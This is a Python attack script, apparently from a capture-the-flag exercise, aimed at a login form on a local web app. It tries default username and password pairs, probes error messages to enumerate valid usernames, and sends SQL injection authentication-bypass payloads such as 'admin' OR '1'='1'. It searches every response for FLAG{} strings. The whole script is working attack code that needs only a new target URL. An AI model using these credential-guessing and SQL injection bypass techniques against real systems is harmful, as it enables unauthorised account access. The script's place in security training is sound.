import requests
import hashlib
import re

# Since we can't crack it easily, let's try common credentials and observe responses
url = "http://127.0.0.1:32892/index.php"
headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://127.0.0.1:32892",
    "Referer": "http://127.0.0.1:32892/"
}

cookies = {
    "PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol"
}

# Test credentials to understand the response format
test_credentials = [
    ("admin", "admin"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("admin", "Admin123"),
    ("admin", "letmein"),
    ("payroll", "payroll"),
    ("hr", "hr123"),
]

print("[*] Testing various credentials to understand response patterns...\n")

for username, password in test_credentials:
    data = {
        "username": username,
        "password": password,
        "submit": "submit"
    }
    
    response = requests.post(url, headers=headers, data=data, cookies=cookies, allow_redirects=False)
    print(f"[*] Testing: {username}:{password}")
    print(f"    Response: {response.text}")
    print(f"    Status: {response.status_code}")
    
    # Check for flags
    flags = re.findall(r'FLAG\{[^}]+\}', response.text)
    if flags:
        print(f"    [!] FLAGS FOUND: {flags}")
    print()

# Now let's try to understand what "password" response means
# Maybe it's telling us the field that's wrong?
print("\n[*] Analysis: The response seems to indicate what field is wrong")
print("[*] 'password' response might mean the password is incorrect")
print("[*] Let's try testing with different usernames to see if we get 'username' response\n")

test_usernames = [
    ("wronguser", "admin"),
    ("test", "admin"),
    ("user", "password"),
    ("administrator", "admin123"),
]

for username, password in test_usernames:
    data = {
        "username": username,
        "password": password,
        "submit": "submit"
    }
    
    response = requests.post(url, headers=headers, data=data, cookies=cookies, allow_redirects=False)
    print(f"[*] Testing: {username}:{password}")
    print(f"    Response: {response.text}")
    print()

# Let's also try SQL injection to bypass authentication
print("\n[*] Testing SQL injection bypasses...\n")

sqli_payloads = [
    ("admin' OR '1'='1", "anything"),
    ("admin' OR 1=1--", "anything"),
    ("admin' OR '1'='1'--", "anything"),
    ("admin' #", "anything"),
    ("admin'/*", "anything"),
    ("' OR '1'='1", "' OR '1'='1"),
]

for username, password in sqli_payloads:
    data = {
        "username": username,
        "password": password,
        "submit": "submit"
    }
    
    response = requests.post(url, headers=headers, data=data, cookies=cookies, allow_redirects=False)
    print(f"[*] Testing SQLi: {username}:{password}")
    print(f"    Response: {response.text}")
    
    flags = re.findall(r'FLAG\{[^}]+\}', response.text)
    if flags:
        print(f"    [!] FLAGS FOUND: {flags}")
    
    if "success" in response.text.lower() and "password" not in response.text:
        print(f"    [+] Possible bypass detected!")
    print()

